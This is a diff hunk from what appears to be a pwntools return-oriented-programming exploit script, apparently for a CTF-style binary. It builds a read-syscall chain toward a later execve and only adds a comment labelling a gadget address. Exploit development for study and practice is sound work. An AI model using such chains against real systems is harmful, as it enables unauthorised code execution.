@@ -56,7 +56,7 @@ rop.raw(rop.find_gadget(['pop rsi', 'ret']))  # Set rsi (buffer)
 rop.raw(data_addr)  # Buffer (writable section address)
 # rop.raw(rop.find_gadget(['pop rdx', 'ret']))  # Set rdx (number of bytes)
 # rop.raw(0x100)  # Read up to 256 bytes
-rop.raw(0x0000000000422dd4) 
+rop.raw(0x0000000000422dd4) # mov rax, rdi; ret
 rop.raw(rop.find_gadget(['syscall', 'ret']))  # Trigger the syscall
 # return to main, so that we can execute the execve syscall in the next iteration
 # rop.raw(rop.find_gadget(['pop rbx', 'ret']))  # Set rdi (stdin)
